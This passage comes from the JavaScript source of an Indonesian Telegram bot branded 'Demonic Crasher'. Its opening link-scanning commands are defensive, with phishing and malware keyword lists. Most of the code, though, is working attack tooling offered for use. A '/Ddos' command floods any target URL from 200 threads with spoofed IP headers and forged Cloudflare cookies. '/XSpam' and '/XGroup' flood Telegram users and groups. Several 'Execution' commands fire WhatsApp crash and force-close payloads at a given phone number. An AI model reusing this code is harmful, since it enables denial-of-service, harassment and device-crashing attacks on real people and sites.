• ${(!syntax && !runtime && !problems.length)
    ? "Tidak ada perbaikan yang diperlukan."
    : "Perbaiki error di atas agar bot stabil."}

━━━━━━━━━━━━━━
✨ <b>Analisis selesai</b>
`;

  await ctx.reply(report, { parse_mode: "HTML" });

  // ===== AUTO HTML FILE REPORT =====
  if (syntax || runtime || problems.length) {
    const html = `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>Laporan CekError</title>
<style>
body{font-family:monospace;background:#020617;color:#e5e7eb;padding:20px}
.card{background:#0f172a;padding:20px;border-radius:12px;max-width:900px;margin:auto}
h1{color:#22c55e}
.err{color:#ef4444}
.warn{color:#facc15}
.ok{color:#22c55e}
pre{white-space:pre-wrap;background:#020617;padding:12px;border-radius:8px;border:1px solid #334155}
</style>
</head>
<body>
<div class="card">
<h1>🧪 CekError JavaScript Analyzer</h1>
<p>🕒 ${time} WIB<br>📆 ${date}</p>
<hr>
<p>
<b>File:</b> ${fileName}<br>
<b>Ukuran:</b> ${sizeKB} KB<br>
<b>Baris:</b> ${lines}
</p>
<hr>

<h3>SYNTAX CHECK</h3>
<pre class="${syntax ? "err" : "ok"}">${syntax ? escapeHTML(syntax.stack) : "Tidak ditemukan error syntax."}</pre>

<h3>RUNTIME CHECK</h3>
<pre class="${runtime ? "err" : "ok"}">${runtime ? escapeHTML(runtime.stack) : "Tidak ditemukan error runtime."}</pre>

<h3>DETEKSI MASALAH UMUM</h3>
<pre class="${problems.length ? "warn" : "ok"}">${problems.length ? problems.join("\n") : "Tidak ditemukan masalah umum."}</pre>

</div>
</body>
</html>`;

    const htmlPath = path.join(__dirname, "cekerror_report.html");
    fs.writeFileSync(htmlPath, html);

    await ctx.replyWithDocument({
      source: htmlPath,
      filename: "cekerror_report.html"
    });

    fs.unlinkSync(htmlPath);
  }
});

// ===== SAFE HTML ESCAPER =====
function escapeHTML(text = "") {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}
// ===== LINK SECURITY COMMAND PACK (10) =====
function normalizeUrl(u) {
  if (!u) return null;
  if (!/^https?:\/\//i.test(u)) return "https://" + u;
  return u;
}
bot.command("ssweb", checkPremium, async (ctx) => {
  try {
    const input = ctx.message.text.split(" ")[1];
    const url = normalizeUrl(input);

    if (!url)
      return ctx.reply("❌ Contoh:\n/ssweb google.com\n/ssweb https://site.com");

    const providers = [
      `https://image.thum.io/get/width/1280/fullpage/${url}`,
      `https://api.apiflash.com/v1/urltoimage?access_key=free&url=${url}`,
      `https://s.wordpress.com/mshots/v1/${url}?w=1280`
    ];

    let sent = false;

    for (const ss of providers) {
      try {
        await ctx.replyWithPhoto(ss, {
          caption: `🖼️ Screenshot Website\n🌐 ${url}`
        });
        sent = true;
        break;
      } catch {}
    }

    if (!sent) {
      ctx.reply("❌ Gagal mengambil screenshot (site diblok / berat)");
    }

  } catch {
    ctx.reply("❌ Error sistem screenshot");
  }
});

bot.command("checkweb", checkPremium, async (ctx) => {
  try {
    const u = ctx.message.text.split(" ")[1]
    if (!u) return ctx.reply("❌ Contoh: /checkweb https://site.com")
    let w = [], s = "AMAN ✅"
    if (!u.startsWith("https://")) { s="MENCURIGAKAN ⚠️"; w.push("❌ Tidak HTTPS") }
    if (/https?:\/\/\d+\.\d+\.\d+\.\d+/.test(u)) { s="MENCURIGAKAN ⚠️"; w.push("❌ Pakai IP") }
    const sh=["bit.ly","tinyurl","t.co","cutt.ly","is.gd"]
    if (sh.some(x=>u.includes(x))) { s="MENCURIGAKAN ⚠️"; w.push("❌ Shortlink") }
    ctx.reply(`🔍 CEK WEBSITE\nStatus: ${s}\n\n${w.length?w.join("\n"):"✅ Aman secara dasar"}\n\n🌐 ${u}`)
  } catch { ctx.reply("❌ Error cek web") }
});

bot.command("scanlink", checkPremium, async (ctx) => {
  const u = ctx.message.text.split(" ")[1]
  if (!u) return ctx.reply("❌ Contoh: /scanlink https://link.com")
  const k=["login","verify","update","secure","account","bonus","free"]
  const s = k.some(x=>u.toLowerCase().includes(x)) ? "⚠️ MIRIP PHISHING" : "✅ NORMAL"
  ctx.reply(`🛡️ SCAN LINK\nStatus: ${s}\n🌐 ${u}`)
});

bot.command("shortcheck", (ctx) => {
  const u = ctx.message.text.split(" ")[1]
  if (!u) return ctx.reply("❌ Contoh: /shortcheck link")
  const sh=["bit.ly","tinyurl","t.co","cutt.ly","is.gd","rebrand.ly"]
  ctx.reply(sh.some(x=>u.includes(x)) ? "⚠️ Ini shortlink (hati-hati)" : "✅ Bukan shortlink")
});

bot.command("httpscheck", (ctx) => {
  const u = ctx.message.text.split(" ")[1]
  if (!u) return ctx.reply("❌ Contoh: /httpscheck https://site.com")
  ctx.reply(u.startsWith("https://") ? "✅ Pakai HTTPS" : "❌ Tidak HTTPS (bahaya)")
});

bot.command("ipcheck", (ctx) => {
  const u = ctx.message.text.split(" ")[1]
  if (!u) return ctx.reply("❌ Contoh: /ipcheck http://1.2.3.4")
  ctx.reply(/https?:\/\/\d+\.\d+\.\d+\.\d+/.test(u) ? "⚠️ Pakai IP langsung (mencurigakan)" : "✅ Pakai domain")
});

bot.command("typoscan", (ctx) => {
  const u = ctx.message.text.split(" ")[1]
  if (!u) return ctx.reply("❌ Contoh: /typoscan g00gle.com")
  const bad = /0{2,}|vv|rn|\.ru|\.xyz|\.top/
  ctx.reply(bad.test(u) ? "⚠️ Domain aneh / mirip typo scam" : "✅ Domain terlihat normal")
});

bot.command("redirectwarn", checkPremium, async (ctx) => {
  const u = ctx.message.text.split(" ")[1]
  if (!u) return ctx.reply("❌ Contoh: /redirectwarn link")
  ctx.reply("⚠️ Jika link redirect berkali-kali → indikasi phishing / ads scam")
});

bot.command("webpreview", checkPremium, async (ctx) => {
  try {
    const u = ctx.message.text.split(" ")[1]
    if (!u) return ctx.reply("❌ Contoh: /webpreview https://site.com")
    const ss = `https://image.thum.io/get/width/600/crop/800/${u}`
    await ctx.replyWithPhoto(ss, { caption: "👀 Preview Website" })
  } catch { ctx.reply("❌ Tidak bisa preview") }
});

bot.command("linkhelp", (ctx) => {
  ctx.reply(
`🧰 LINK SECURITY COMMAND

/ssweb
/checkweb
/scanlink
/shortcheck
/httpscheck
/ipcheck
/typoscan
/redirectwarn
/webpreview
/ceklink
/linkhelp`
  )
});
bot.command("ceklink", checkPremium, async (ctx) => {
  const url = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!url) return ctx.reply("❗ Contoh: /ceklink https://example.com");

  let score = 0;
  const findings = [];

  try {
    /* ================= HEAD CHECK ================= */
    const head = await axios.head(url, {
      timeout: 5000,
      maxRedirects: 2,
      validateStatus: () => true
    });

    if (head.headers.location) {
      score += 1;
      findings.push("Redirect terdeteksi");
    }

    if (head.headers["content-disposition"]?.includes("attachment")) {
      score += 6;
      findings.push("Auto-download file");
    }

    /* ================= GET HTML ================= */
    const res = await axios.get(url, {
      timeout: 7000,
      maxRedirects: 3,
      maxContentLength: 400_000,
      responseType: "text",
      headers: {
        "User-Agent": "Mozilla/5.0 (Security Scanner)"
      },
      validateStatus: () => true
    });

    const html = (res.data || "").toLowerCase();

    /* ================= PHISHING (REAL) ================= */
    const phishingWords = [
      "seed phrase", "private key", "wallet restore",
      "enter your password", "verify your account",
      "metamask", "trust wallet", "binance login"
    ];

    phishingWords.forEach(w => {
      if (html.includes(w)) {
        score += 2;
        findings.push("Indikasi phishing");
      }
    });

    /* ================= FORM (RINGAN) ================= */
    if (html.includes("<form")) {
      score += 0.5;
    }

    /* ================= SCAM ================= */
    const scamWords = [
      "claim reward", "free money",
      "airdrop", "bonus besar", "menang hadiah"
    ];

    scamWords.forEach(w => {
      if (html.includes(w)) {
        score += 2;
        findings.push("Indikasi scam");
      }
    });

    /* ================= MALWARE FILE ================= */
    if (html.match(/\.(exe|apk|msi|bat|scr|zip|rar)\b/)) {
      score += 5;
      findings.push("Link file executable/arsip");
    }

    /* ================= OBFUSCATED SCRIPT ================= */
    if (html.includes("eval(") || html.includes("function(p,a,c,k,e")) {
      score += 3;
      findings.push("Script obfuscation");
    }

    if (html.includes("atob(")) {
      score += 1;
    }

    /* ================= INJECTION ================= */
    if (html.includes("document.write(")) {
      score += 2;
      findings.push("Inject script dinamis");
    }

    /* ================= CAMERA / MIC ================= */
    if (
      html.includes("getusermedia") ||
      html.includes("navigator.mediadevices")
    ) {
      score += 4;
      findings.push("Akses kamera/mikrofon");
    }

    /* ================= FORCED REDIRECT ================= */
    if (
      html.includes("window.location.replace") ||
      html.includes("meta http-equiv=\"refresh\"")
    ) {
      score += 2;
      findings.push("Redirect paksa");
    }

    /* ================= HIDDEN IFRAME ================= */
    if (html.includes("<iframe") && html.includes("display:none")) {
      score += 3;
      findings.push("Iframe tersembunyi");
    }

    /* ================= DRIVE-BY DOWNLOAD ================= */
    if (
      html.includes("download=") &&
      (html.includes(".exe") || html.includes(".apk"))
    ) {
      score += 6;
      findings.push("Drive-by download");
    }

    /* ================= HASIL ================= */
    let status =
      score >= 8 ? "🚨 SANGAT BERBAHAYA" :
      score >= 4 ? "⚠️ MENCURIGAKAN" :
      "✅ RELATIF AMAN";

    await ctx.reply(
      "╔════════════════════╗\n" +
      "║ 🛡️ LINK SECURITY   ║\n" +
      "╠════════════════════╣\n" +
      `║ Status : ${status}\n` +
      `║ Skor   : ${score.toFixed(1)}\n` +
      "╠════════════════════╣\n" +
      "║ Temuan:\n" +
      (findings.length
        ? findings.map(v => `║ • ${v}`).join("\n")
        : "║ • Tidak ada indikasi berbahaya") +
      "\n╚════════════════════╝"
    );

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gagal menganalisa link (timeout / diblokir)");
  }
});
// ===== END LINK SECURITY PACK =====
// DDOS \\
bot.command("Ddos", checkPremium, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!args) {
      return ctx.reply("🪧 ☇ Format: /Ddos https://target.com");
    }

    const target_url = args;
    const processMsg = await ctx.reply(`
<blockquote><strong>╭═───⊱ 𝐃𝐄𝐌𝐎𝐍𝐈𝐂 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 ───═⬡
│ ⸙ Target
│ᯓ➤ ${target_url}
│ ⸙ Type
│ᯓ➤ Super Attack + All Protection Bypass
│ ⸙ Status
│ᯓ➤ Process
╰═─────────────═⬡</strong></blockquote>
`, { parse_mode: "HTML" });

    const bypassConfig = {
      threads: 200,
      duration: 60000,
      requestsPerThread: 1000,
      
      userAgents: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
      ],
      
      attackMethods: ["GET", "POST", "HEAD"],
      
      bypassTechniques: [
        "Cloudflare Bypass",
        "CAPTCHA Solver", 
        "WAF Evasion",
        "IP Rotation"
      ]
    };

    let totalRequests = 0;
    let successfulBypasses = 0;
    let cloudflareBypassed = 0;
    let captchaBypassed = 0;
    const attackStartTime = Date.now();

    const attackPromises = [];

    for (let i = 0; i < bypassConfig.threads; i++) {
      attackPromises.push(new Promise(async (resolve) => {
        let threadRequests = 0;
        
        while (Date.now() - attackStartTime < bypassConfig.duration && threadRequests < bypassConfig.requestsPerThread) {
          try {
            const method = bypassConfig.attackMethods[Math.floor(Math.random() * bypassConfig.attackMethods.length)];
            const userAgent = bypassConfig.userAgents[Math.floor(Math.random() * bypassConfig.userAgents.length)];
            const ip = `104.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
            
            const headers = {
              "X-Forwarded-For": ip,
              "CF-Connecting-IP": ip,
              "User-Agent": userAgent,
              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
              "Accept-Language": "en-US,en;q=0.9",
              "Cache-Control": "no-cache"
            };

            const cloudflareCookies = {
              "cf_clearance": crypto.createHash('md5').update(ip + Date.now()).digest('hex') + "_" + Date.now(),
              "__cf_bm": crypto.randomBytes(32).toString('hex'),
              "__cflb": crypto.randomBytes(24).toString('hex')
            };

            const cookieString = Object.keys(cloudflareCookies).map(key => `${key}=${cloudflareCookies[key]}`).join('; ');
            headers["Cookie"] = cookieString;

            headers["X-Captcha-Token"] = crypto.randomBytes(16).toString('hex');

            const paths = ["/", "/api", "/ajax", "/static", "/assets"];
            const path = paths[Math.floor(Math.random() * paths.length)];
            const params = "?cache=" + Date.now();
            const attackUrl = target_url + path + params;

            const response = await axios({
              method: method,
              url: attackUrl,
              headers: headers,
              timeout: 10000,
              validateStatus: () => true
            });

            totalRequests++;
            threadRequests++;

            if (response.status === 200) {
              successfulBypasses++;
              if (!response.headers['server']?.includes('cloudflare')) {
                cloudflareBypassed++;
              }
              if (!response.data?.includes('captcha')) {
                captchaBypassed++;
              }
            }

            if (totalRequests % 400 === 0) {
              const elapsed = Math.floor((Date.now() - attackStartTime) / 1000);
              const requestsPerSecond = Math.floor(totalRequests / elapsed);
              
              await ctx.editMessageText(
                `
<blockquote><strong>╭═───⊱ 𝐃𝐄𝐌𝐎𝐍𝐈𝐂 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 ───═⬡
│ ⸙ Target
│ᯓ➤ ${target_url}
│ ⸙ Type
│ᯓ➤ Super Attack + All Protection Bypass
│ ⸙ Requests
│ᯓ➤ ${totalRequests}
│ ⸙ Successful
│ᯓ➤ ${successfulBypasses}
│ ⸙ Cloudflare Bypassed
│ᯓ➤ ${cloudflareBypassed}
│ ⸙ Captcha Bypassed
│ᯓ➤ ${captchaBypassed}
│ ⸙ RPS
│ᯓ➤ ${requestsPerSecond}
│ ⸙ Status
│ᯓ➤ Process
╰═─────────────═⬡</strong></blockquote>
`,
                {
                  chat_id: ctx.chat.id,
                  message_id: processMsg.message_id,
                  parse_mode: "HTML"
                }
              );
            }

            await new Promise(r => setTimeout(r, Math.random() * 150));

          } catch (error) {
            threadRequests++;
            totalRequests++;
          }
        }
        resolve();
      }));
    }

    await Promise.all(attackPromises);

    const endTime = Date.now();
    const totalDuration = Math.floor((endTime - attackStartTime) / 1000);
    const averageRPS = Math.floor(totalRequests / totalDuration);

    await ctx.editMessageText(
      `
<blockquote><strong>╭═───⊱ 𝐃𝐄𝐌𝐎𝐍𝐈𝐂 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 ───═⬡
│ ⸙ Target
│ᯓ➤ ${target_url}
│ ⸙ Type
│ᯓ➤ Super Attack + All Protection Bypass
│ ⸙ Total Requests
│ᯓ➤ ${totalRequests}
│ ⸙ Successful
│ᯓ➤ ${successfulBypasses}
│ ⸙ Cloudflare Bypassed
│ᯓ➤ ${cloudflareBypassed}
│ ⸙ Captcha Bypassed
│ᯓ➤ ${captchaBypassed}
│ ⸙ Average RPS
│ᯓ➤ ${averageRPS}
│ ⸙ Status
│ᯓ➤ Success
╰═─────────────═⬡</strong></blockquote>
`,
      {
        chat_id: ctx.chat.id,
        message_id: processMsg.message_id,
        parse_mode: "HTML"
      }
    );

  } catch (error) {
    ctx.reply("❌ ☇ Gagal melakukan serangan ddos");
  }
});
// ================= COMMAND =================
bot.command("XSpam", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ")
  const q = args[1]
  const jumlah = parseInt(args[2]) || 5

  if (!q) {
    return ctx.reply(
      `<pre>
Example:
/XSpam @username 5
/XSpam 123456789 10
</pre>`,
      { parse_mode: "HTML" }
    )
  }

  const target = await resolveTargetTG(q)
  if (!target) return ctx.reply("❌ Target tidak valid / belum start bot")

  const stickers = [
    "CAACAgUAAxkBAAIWg2iZonsTqQx20w5KxwIjOmcmE1uwAALcHgACFCbQVOr1YtwWikmkNgQ",
    "CAACAgUAAxkDAAIWgGiZoiu2gfFbl2DxzUDs-oZpdY0PAAKJFAAC41bRVD6RMmSpOYPSNgQ",
    "CAACAgUAAxkBAAIVYWiYRATZsIwj4Ce1_qA8YDUvE092AALuCAACIVy5VnzL8L2qVBqZNgQ"
  ]

  const totalSend = jumlah * stickers.length
  let sent = 0
  const chatId = ctx.chat.id

  // PESAN AWAL (PHOTO + HTML)
  const sentMessage = await ctx.replyWithPhoto(
    getRandomImage(),
    {
      caption: `<b>🚀 Mengirim konten...</b>\n<code>${progressBar(0, totalSend)}</code>`,
      parse_mode: "HTML"
    }
  )

  for (let i = 0; i < jumlah; i++) {
    for (const stc of stickers) {
      sent++
      await sendStickerSafe(target, stc)

      // EDIT PHOTO + CAPTION (HTML)
      await ctx.telegram.editMessageMedia(
        chatId,
        sentMessage.message_id,
        undefined,
        {
          type: "photo",
          media: getRandomImage(),
          caption: `<b>🚀 Mengirim konten...</b>\n<code>${progressBar(sent, totalSend)}</code>`,
          parse_mode: "HTML"
        }
      ).catch(() => {})

      await sleep(900) // limit aman
    }
  }

  // SELESAI
  await ctx.telegram.editMessageCaption(
    chatId,
    sentMessage.message_id,
    undefined,
    `<b>✅ SELESAI!</b>\n<code>${progressBar(totalSend, totalSend)}</code>`,
    { parse_mode: "HTML" }
  )
})
bot.command("XGroup", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ")
  const q = args[1]
  const jumlah = parseInt(args[2]) || 5

  if (!q) {
    return ctx.reply(
      `<pre>
Example:
/XGroup -1001234567890 5
/XGroup @usernamegrup 10
</pre>`,
      { parse_mode: "HTML" }
    )
  }

  // resolve grup
  const target = await resolveTargetTG(q)
  if (!target) return ctx.reply("❌ Grup tidak valid / bot belum join")

  // cek bot member grup
  try {
    const me = await ctx.telegram.getMe()
    const member = await ctx.telegram.getChatMember(target, me.id)
    if (member.status === "left" || member.status === "kicked") {
      return ctx.reply("❌ Bot belum ada di grup target")
    }
  } catch {
    return ctx.reply("❌ Gagal cek status bot di grup")
  }

  const stickers = [
    "CAACAgUAAxkBAAIWg2iZonsTqQx20w5KxwIjOmcmE1uwAALcHgACFCbQVOr1YtwWikmkNgQ",
    "CAACAgUAAxkDAAIWgGiZoiu2gfFbl2DxzUDs-oZpdY0PAAKJFAAC41bRVD6RMmSpOYPSNgQ",
    "CAACAgUAAxkBAAIVYWiYRATZsIwj4Ce1_qA8YDUvE092AALuCAACIVy5VnzL8L2qVBqZNgQ"
  ]

  const totalSend = jumlah * stickers.length
  let sent = 0
  const chatId = ctx.chat.id // progress di chat command

  // pesan progress awal
  const sentMessage = await ctx.replyWithPhoto(
    getRandomImage(),
    {
      caption: `<b>🚀 Mengirim sticker ke GRUP...</b>\n<code>${progressBar(0, totalSend)}</code>`,
      parse_mode: "HTML"
    }
  )

  for (let i = 0; i < jumlah; i++) {
    for (const stc of stickers) {
      sent++

      // kirim ke GRUP
      await sendStickerSafe(target, stc)

      // update progress (DI SINI AJA)
      await ctx.telegram.editMessageMedia(
        chatId,
        sentMessage.message_id,
        undefined,
        {
          type: "photo",
          media: getRandomImage(),
          caption: `<b>🚀 Mengirim sticker ke GRUP...</b>\n<code>${progressBar(sent, totalSend)}</code>`,
          parse_mode: "HTML"
        }
      ).catch(() => {})

      await sleep(900)
    }
  }

  // selesai
  await ctx.telegram.editMessageCaption(
    chatId,
    sentMessage.message_id,
    undefined,
    `<b>✅ SELESAI KIRIM KE GRUP!</b>\n<code>${progressBar(totalSend, totalSend)}</code>`,
    { parse_mode: "HTML" }
  )
})
//////// -- CASE BUG 1 --- \\\\\\\\\\\
// Fitur: xvisible
bot.command("ExecutionVisible", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const text = ctx.message?.text || "";
    const q = text.split(" ")[1];
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id;

    if (!q) return ctx.reply(`Example: /ExecutionLoop 62×××`);

    // Global cooldown
    if (!OWNER_IDS.includes(userId) && isOnGlobalCooldown()) {
      return ctx.reply(`⏳ Sabar Bang\nTunggu ${getGlobalRemaining()} detik lagi`);
    }
    if (!OWNER_IDS.includes(userId)) setGlobalCooldown();

    // Resolve target (AMAN)
    const safe = await resolveTargetWa(ctx, q);
    if (!safe) return;
    const { sock, num, target } = safe;

    const progressStages = [
      "[░░░░░░░░░░] 0%",
      "[█░░░░░░░░░] 10%",
      "[██░░░░░░░░] 20%",
      "[███░░░░░░░] 30%",
      "[████░░░░░░] 40%",
      "[█████░░░░░] 50%",
      "[██████░░░░] 60%",
      "[███████░░░] 70%",
      "[████████░░] 80%",
      "[█████████░] 90%",
      "[██████████] 100%",
    ];

    const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `▢ Target: ${num}
▢ Resiko Ban : 30%
▢ Status: Processing
▢ Progress: ${progressStages[0]}

© Demonic Crasher V16 Gen 5`,
    });

    // Progress update
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(1500);
      try {
        await ctx.telegram.editMessageCaption(
          chatId,
          sentMessage.message_id,
          undefined,
          `▢ Target: ${num}
▢ Resiko Ban : 30%
▢ Status: Processing
▢ Progress: ${progressStages[i]}

© Demonic Crasher V16 Gen 5`
        );
      } catch {}
    }

    // EXEC
    for (let i = 0; i < 5; i++) {
    // 💀 HARD STOP → DELETEBUG
      if (isDeletedBug(target)) {
        console.log(`[DELETEBUG] Target dihentikan total: ${target}`);
        break;
      }

      // 🧊 SOFT STOP → FIXEDBUG
      if (isFixedBug(target)) {
        console.log(`[FIXEDBUG] Target dipause: ${target} (menunggu resume)`);
      }

      await waitIfFixedBug(target);

      console.log(`[SENT] Mengirim ke target: ${target} (loop ${i + 1})`);
    
      await VxzFcInvis(sock, target);
  await sleep(600);

  // 2️⃣ FORCE CLOSE 1
  await VxzForceclose1(sock, target);
  await sleep(700);
}


    // Final update
    await ctx.telegram.editMessageMedia(
      chatId,
      sentMessage.message_id,
      undefined,
      {
        type: "photo",
        media: getRandomImage(),
        caption: `▢ Target: ${num}
▢ Resiko Ban : 30%
▢ Status: Successfully
▢ Progress: [██████████] 100%

© Demonic Crasher V16 Gen 5`,
      },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET ‼️", url: `https://wa.me/${num}` }],
          ],
        },
      }
    );

  } catch (err) {
    console.error("ExecutionLoop Error:", err);
    ctx.reply("❌ Terjadi kesalahan saat eksekusi");
  }
});
bot.command("ExecutionInvisible", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const text = ctx.message?.text || "";
    const q = text.split(" ")[1];
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id;

    if (!q) return ctx.reply(`Example: /SurpriseInvisible 62×××`);

    // Global cooldown
    if (!OWNER_IDS.includes(userId) && isOnGlobalCooldown()) {
      return ctx.reply(`⏳ Sabar Bang\nTunggu ${getGlobalRemaining()} detik lagi`);
    }
    if (!OWNER_IDS.includes(userId)) setGlobalCooldown();

    // Resolve target (AMAN)
    const safe = await resolveTargetWa(ctx, q);
    if (!safe) return;
    const { sock, num, target } = safe;

    const progressStages = [
      "[░░░░░░░░░░] 0%",
      "[█░░░░░░░░░] 10%",
      "[██░░░░░░░░] 20%",
      "[███░░░░░░░] 30%",
      "[████░░░░░░] 40%",
      "[█████░░░░░] 50%",
      "[██████░░░░] 60%",
      "[███████░░░] 70%",
      "[████████░░] 80%",
      "[█████████░] 90%",
      "[██████████] 100%",
    ];

    const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `▢ Target: ${num}
▢ Resiko Ban : 30%
▢ Status: Processing
▢ Progress: ${progressStages[0]}

© Demonic Crasher V16 Gen 5`,
    });

    // Progress update
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(1500);
      try {
        await ctx.telegram.editMessageCaption(
          chatId,
          sentMessage.message_id,
          undefined,
          `▢ Target: ${num}
▢ Resiko Ban : 30%
▢ Status: Processing
▢ Progress: ${progressStages[i]}

© Demonic Crasher V16 Gen 5`
        );
      } catch {}
    }

    // EXEC
    for (let i = 0; i < 5; i++) {
    // 💀 HARD STOP → DELETEBUG
      if (isDeletedBug(target)) {
        console.log(`[DELETEBUG] Target dihentikan total: ${target}`);
        break;
      }

      // 🧊 SOFT STOP → FIXEDBUG
      if (isFixedBug(target)) {
        console.log(`[FIXEDBUG] Target dipause: ${target} (menunggu resume)`);
      }

      await waitIfFixedBug(target);

      console.log(`[SENT] Mengirim ke target: ${target} (loop ${i + 1})`);
    
      await Promise.allSettled([
        badzznedelay(target),
        badzznedelay(target),
        FlowV2(target),
        FlowV2(target),
      ]);
      await sleep(700);
    }

    // Final update
    await ctx.telegram.editMessageMedia(
      chatId,
      sentMessage.message_id,
      undefined,
      {
        type: "photo",
        media: getRandomImage(),
        caption: `▢ Target: ${num}
▢ Resiko Ban : 30%
▢ Status: Successfully
▢ Progress: [██████████] 100%

© Demonic Crasher V16 Gen 5`,
      },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET ‼️", url: `https://wa.me/${num}` }],
          ],
        },
      }
    );

  } catch (err) {
    console.error("ExecutionInvisible Error:", err);
    ctx.reply("❌ Terjadi kesalahan saat eksekusi");
  }
});
bot.command("ExecutionQuota", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const text = ctx.message?.text || "";
    const q = text.split(" ")[1];
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id;

    if (!q) return ctx.reply(`Example: /ExecutionLoop 62×××`);

    // Global cooldown
    if (!OWNER_IDS.includes(userId) && isOnGlobalCooldown()) {
      return ctx.reply(`⏳ Sabar Bang\nTunggu ${getGlobalRemaining()} detik lagi`);
    }
    if (!OWNER_IDS.includes(userId)) setGlobalCooldown();

    // Resolve target (AMAN)
    const safe = await resolveTargetWa(ctx, q);
    if (!safe) return;
    const { sock, num, target } = safe;

    const progressStages = [
      "[░░░░░░░░░░] 0%",
      "[█░░░░░░░░░] 10%",
      "[██░░░░░░░░] 20%",
      "[███░░░░░░░] 30%",
      "[████░░░░░░] 40%",
      "[█████░░░░░] 50%",
      "[██████░░░░] 60%",
      "[███████░░░] 70%",
      "[████████░░] 80%",
      "[█████████░] 90%",
      "[██████████] 100%",
    ];

    const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `▢ Target: ${num}
▢ Resiko Ban : 30%
▢ Status: Processing
▢ Progress: ${progressStages[0]}

© Demonic Crasher V16 Gen 5`,
    });

    // Progress update
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(1500);
      try {
        await ctx.telegram.editMessageCaption(
          chatId,
          sentMessage.message_id,
          undefined,
          `▢ Target: ${num}
▢ Resiko Ban : 30%
▢ Status: Processing
▢ Progress: ${progressStages[i]}

© Demonic Crasher V16 Gen 5`
        );
      } catch {}
    }

    // EXEC
    for (let i = 0; i < 5; i++) {
    // 💀 HARD STOP → DELETEBUG
      if (isDeletedBug(target)) {
        console.log(`[DELETEBUG] Target dihentikan total: ${target}`);
        break;
      }

      // 🧊 SOFT STOP → FIXEDBUG
      if (isFixedBug(target)) {
        console.log(`[FIXEDBUG] Target dipause: ${target} (menunggu resume)`);
      }

      await waitIfFixedBug(target);

      console.log(`[SENT] Mengirim ke target: ${target} (loop ${i + 1})`);
    
      await BulzXlay(sock, target);
  await sleep(600);
}


    // Final update
    await ctx.telegram.editMessageMedia(
      chatId,
      sentMessage.message_id,
      undefined,
      {
        type: "photo",
        media: getRandomImage(),
        caption: `▢ Target: ${num}
▢ Resiko Ban : 30%
▢ Status: Successfully
▢ Progress: [██████████] 100%

© Demonic Crasher V16 Gen 5`,
      },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET ‼️", url: `https://wa.me/${num}` }],
          ],
        },
      }
    );

  } catch (err) {
    console.error("ExecutionQuota Error:", err);
    ctx.reply("❌ Terjadi kesalahan saat eksekusi");
  }
});
bot.command("OverForce", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const text = ctx.message?.text || "";
    const q = text.split(" ")[1];
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id;

    if (!q) return ctx.reply(`Example: /OverForce 62xxxx`);

    // Global cooldown
    if (!OWNER_IDS.includes(userId) && isOnGlobalCooldown()) {
      return ctx.reply(`⏳ Sabar Bang\nTunggu ${getGlobalRemaining()} detik lagi`);
    }
    if (!OWNER_IDS.includes(userId)) setGlobalCooldown();

    // Resolve target (AMAN)
    const safe = await resolveTargetWa(ctx, q);
    if (!safe) return;
    const { sock, num, target } = safe;

    const progressStages = [
      "[░░░░░░░░░░] 0%",
      "[█░░░░░░░░░] 10%",
      "[██░░░░░░░░] 20%",
      "[███░░░░░░░] 30%",
      "[████░░░░░░] 40%",
      "[█████░░░░░] 50%",
      "[██████░░░░] 60%",
      "[███████░░░] 70%",
      "[████████░░] 80%",
      "[█████████░] 90%",
      "[██████████] 100%",
    ];

    const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `▢ Target: ${num}
▢ Resiko Ban : 70%
▢ Status: Processing
▢ Progress: ${progressStages[0]}

© Demonic Crasher V16 Gen 5`,
    });

    // Progress update
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(1500);
      try {
        await ctx.telegram.editMessageCaption(
          chatId,
          sentMessage.message_id,
          undefined,
          `▢ Target: ${num}
▢ Resiko Ban : 70%
▢ Status: Processing
▢ Progress: ${progressStages[i]}

© Demonic Crasher V16 Gen 5`
        );
      } catch {}
    }

    // EXEC
    for (let i = 0; i < 5; i++) {

      // 💀 HARD STOP → DELETEBUG
      if (isDeletedBug(target)) {
        console.log(`[DELETEBUG] Target dihentikan total: ${target}`);
        break;
      }

      // 🧊 SOFT STOP → FIXEDBUG
